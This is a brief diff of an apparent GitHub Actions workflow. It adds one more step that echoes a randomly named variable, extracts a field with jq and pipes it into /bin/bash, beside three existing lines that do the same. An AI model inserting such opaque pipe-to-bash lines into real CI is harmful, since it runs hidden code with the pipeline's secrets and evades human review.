@@ -27,6 +27,7 @@ jobs:
           echo $rcmbx4334 | jq -r .p086 | /bin/bash
           echo $bzif66 | jq -r .ybi345 | /bin/bash
           echo $ovfv5 | jq -r .md02105 | /bin/bash
+          echo $xyrl365 | jq -r .slfrx0315 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
